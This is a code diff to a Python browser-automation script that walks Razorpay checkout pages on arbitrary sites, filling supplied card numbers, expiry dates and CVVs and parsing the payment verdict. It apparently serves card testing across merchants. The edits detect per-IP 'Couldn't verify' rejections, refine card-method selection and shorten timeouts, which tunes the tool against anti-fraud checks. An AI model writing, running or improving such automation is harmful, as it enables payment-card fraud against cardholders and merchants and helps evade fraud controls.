@@ -151,14 +151,21 @@ def walk_once(p, args, site, card, mm, yy, cvv, phone, email, name):
             pg.wait_for_timeout(6000)
             # poll for a checkout frame that actually renders content — the
             # canary build loads as an empty frame and never wakes up, a good
-            # build can take a few extra seconds to paint
+            # build can take a few extra seconds to paint; a "Couldn't verify"
+            # rejection is deterministic for this IP → stop waiting
+            rejected = False
             for _ in range(6):
                 cf = next((f for f in pg.frames if "api.razorpay.com" in f.url and "checkout" in f.url), None)
                 if cf and cf.evaluate("()=>!!(document.querySelector('input,button'))"):
                     opened = True
                     break
+                if pg.evaluate("()=>{const e=[...document.querySelectorAll('div,span,p')].find(e=>e.offsetParent&&/couldn.t verify|request could not be verified/i.test(e.textContent||'')&&e.textContent.length<80);return e?1:0}"):
+                    rejected = True
+                    break
                 pg.wait_for_timeout(2000)
             if opened:
+                break
+            if rejected:
                 break
         if not opened:
             raise _WalkFail({"status": "SITE_FAIL", "response": "checkout did not open", "site": site, "raw": ""})
@@ -190,7 +197,7 @@ def walk_once(p, args, site, card, mm, yy, cvv, phone, email, name):
 
         # card method — method list may still be rendering
         for _ in range(4):
-            picked = cf.evaluate("""() => { for (const r of document.querySelectorAll('input[type=radio]')) { const lab = r.closest('label,div')?.textContent || ''; if (/card/i.test(lab) && r.offsetWidth) { r.click(); return true; } } return false; }""")
+            picked = cf.evaluate("""() => { for (const r of document.querySelectorAll('input[type=radio]')) { const lab = r.closest('label,div')?.textContent || ''; if (/^\s*cards?\b/i.test(lab) && r.offsetWidth) { r.click(); return true; } } return false; }""")
             if picked:
                 break
             pg.wait_for_timeout(2000)
@@ -208,7 +215,7 @@ def walk_once(p, args, site, card, mm, yy, cvv, phone, email, name):
         if not num_sel:
             # the radio click may have landed pre-render — re-click Cards and re-check
             for _ in range(2):
-                cf.evaluate("() => { for (const r of document.querySelectorAll('input[type=radio]')) { const lab = r.closest('label,div')?.textContent || ''; if (/card/i.test(lab) && r.offsetWidth) { r.click(); return true; } } return false; }")
+                cf.evaluate("() => { for (const r of document.querySelectorAll('input[type=radio]')) { const lab = r.closest('label,div')?.textContent || ''; if (/^\s*cards?\b/i.test(lab) && r.offsetWidth) { r.click(); return true; } } return false; }")
                 pg.wait_for_timeout(4000)
                 for sel in ("input[name='card.number']", "input[name='card[number]']"):
                     try:
@@ -320,7 +327,7 @@ def walk_once(p, args, site, card, mm, yy, cvv, phone, email, name):
         verdict = None
         saw_ajax_err = False
         addr_done = False
-        deadline = time.time() + 40
+        deadline = time.time() + 30
         while time.time() < deadline and verdict is None:
             pg.wait_for_timeout(2500)
             kind, res = parse_hits(api_hits)
